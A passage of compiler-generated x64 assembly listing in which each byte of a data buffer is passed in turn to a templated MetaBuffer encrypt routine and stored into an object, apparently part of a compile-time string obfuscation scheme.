  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00541	88 41 1f	 mov	 BYTE PTR [rcx+31], al
  00544	b8 01 00 00 00	 mov	 eax, 1
  00549	48 6b c0 1f	 imul	 rax, rax, 31
  0054d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00554	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00558	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0055f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00564	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0056b	88 41 20	 mov	 BYTE PTR [rcx+32], al
  0056e	b8 01 00 00 00	 mov	 eax, 1
  00573	48 6b c0 20	 imul	 rax, rax, 32		; 00000020H
  00577	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0057e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00582	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
